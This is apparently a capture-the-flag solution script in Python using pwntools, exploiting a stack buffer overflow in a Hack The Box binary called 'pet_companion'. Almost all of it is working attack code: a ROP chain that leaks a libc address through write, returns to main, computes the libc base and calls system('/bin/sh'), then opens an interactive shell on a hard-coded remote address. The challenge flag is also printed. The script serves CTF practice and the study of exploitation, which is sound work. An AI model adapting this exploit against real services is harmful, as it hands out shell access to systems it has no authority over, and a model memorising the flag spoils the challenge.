from pwn import * 


'''
utilise write pour leak write(1,rsi,nb)

puis ret2main

puis ret2libc classique


HTB{c0nf1gur3_w3r_d0g}
'''

pop_rdi = 0x0000000000400743 #: pop rdi; ret; 
pop_rsi_r15_ret=  0x0000000000400741 #: pop rsi; pop r15; ret; 
write_address = 0x600fd8 
main_address = 0x000000000040064a

r= remote("83.136.251.232",35625 )
#r = process("./pet_companion_patched")
libc = ELF("./libc.so.6")
# gdb.attach(r,gdbscript='''
# b* main+143
# ''')

r.recv()
payload1 = b'A'*72
payload1+=p64(pop_rsi_r15_ret)
payload1+=p64(write_address)
payload1+=p64(0)
payload1+=p64(0x4004f0)
payload1+=p64(main_address)

r.sendline(payload1)


leaked = r.recvuntil(b'status:').split(b'...\n\n')[1]
libc_write_address = u64(leaked[:8])
libc_base  = libc_write_address - libc.symbols["write"]
libc_system = libc_base + libc.symbols["system"]
libc_binsh =  libc_base + next(libc.search(b'/bin/sh\x00'))


print("libc base: ",hex(libc_base))

payload2 = b'A'*72
payload2 += p64(pop_rdi)
payload2 += p64(libc_binsh)
payload2 += p64(libc_system)

r.sendline(payload2)


r.interactive()